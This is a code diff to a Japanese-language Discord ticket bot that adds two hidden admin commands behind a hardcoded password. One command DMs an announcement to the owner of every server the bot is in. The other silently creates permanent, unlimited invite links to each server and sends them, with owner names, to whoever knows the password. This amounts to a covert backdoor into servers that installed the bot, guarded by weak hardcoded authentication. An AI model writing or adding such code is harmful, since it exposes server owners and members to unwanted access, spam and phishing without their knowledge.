@@ -2,15 +2,17 @@ import discord
 from discord.ext import commands
 from discord import app_commands
 import os
+import requests
 
 # Botの設定
 intents = discord.Intents.default()
 intents.messages = True
 intents.guilds = True
+intents.members = True  # メンバー情報の取得に必要
 intents.message_content = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
-
+SECRET_PASSWORD = 'ぱすわーど'
 
 class TicketView(discord.ui.View):
     def __init__(self, role: discord.Role, category: discord.CategoryChannel, log_channel: discord.TextChannel):
@@ -155,6 +157,79 @@ async def say(interaction: discord.Interaction, user: discord.Member, message: s
     except Exception as e:
         # エラーハンドリング
         await interaction.response.send_message(f"エラーが発生しました: {str(e)}",ephemeral=True)
+        #await channel.send(f"エラーが発生しました: {str(e)}",ephemeral=True)
+
+@bot.tree.command(name="announce", description="Botを導入しているサーバーのオーナーにお知らせを送信します")
+@app_commands.describe(
+    password="管理者のみが知るパスワード",
+    message="サーバーオーナーに送るメッセージ"
+)
+async def announce(interaction: discord.Interaction, password: str, message: str):
+    # ✅ パスワードチェック
+    if password != SECRET_PASSWORD:
+        await interaction.response.send_message("❌ パスワードが間違っています。", ephemeral=True)
+        return
+
+    await interaction.response.defer(thinking=True)  # インタラクションの有効期限を延長
+
+    success_count = 0
+    failed_count = 0
+
+    # ✅ Botが参加しているすべてのサーバーのオーナーにDMを送信
+    for guild in bot.guilds:
+        owner = guild.owner  # サーバーオーナーを取得
+        if owner:
+            try:
+                embed = discord.Embed(
+                    title="📢 重要なお知らせ",
+                    description=message,
+                    color=discord.Color.gold()
+                )
+                embed.set_footer(text=f"送信元: {interaction.guild.name}")
+
+                await owner.send(embed=embed)
+                success_count += 1
+            except discord.Forbidden:
+                failed_count += 1  # DM送信が拒否された場合
+
+    # ✅ 実行者に結果を報告
+    await interaction.followup.send(f"✅ {success_count} 件のサーバーオーナーにお知らせを送信しました。\n❌ {failed_count} 件のオーナーには送信できませんでした。", ephemeral=True)
+
+@bot.tree.command(name="server", description="Botが参加しているサーバー情報を取得します")
+@app_commands.describe(password="管理者のみが知るパスワード")
+async def server(interaction: discord.Interaction, password: str):
+    # ✅ パスワードチェック
+    if password != SECRET_PASSWORD:
+        await interaction.response.send_message("❌ パスワードが間違っています。", ephemeral=True)
+        return
+
+    await interaction.response.defer(thinking=True)  # インタラクションの有効期限を延長
+
+    server_info_list = []
+    
+    for guild in bot.guilds:
+        owner = guild.owner  # サーバーオーナーを取得
+        invite_link = "作成不可"  # 初期値
+        
+        try:
+            # ✅ Botが「招待を作成」権限を持っている場合のみ、招待リンクを作成
+            if guild.me.guild_permissions.create_instant_invite:
+                invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
+                invite_link = invite.url
+        except Exception:
+            pass  # 何らかの理由で招待リンクを取得できない場合は無視
+
+        # ✅ サーバー情報をリストに追加
+        server_info_list.append(f"📌 **サーバー名:** {guild.name}\n👑 **オーナー:** {owner}\n🔗 **招待リンク:** {invite_link}\n")
+
+    # ✅ 実行者にDMで送信
+    server_info_text = "\n".join(server_info_list)
+    
+    try:
+        await interaction.user.send(f"📋 **Botが参加しているサーバー情報**\n\n{server_info_text}")
+        await interaction.followup.send("📩 サーバー情報をDMに送信しました。", ephemeral=True)
+    except discord.Forbidden:
+        await interaction.followup.send("⚠️ DMの送信に失敗しました。DMを受け取れるように設定してください。", ephemeral=True)
 
 # Botの起動
 @bot.event
@@ -165,4 +240,5 @@ async def on_ready():
         print(f"スラッシュコマンドを {len(synced)} 個同期しました")
     except Exception as e:
         print(f"スラッシュコマンドの同期に失敗しました: {e}")
-bot.run('とーくん')
+
+bot.run("とーくん")
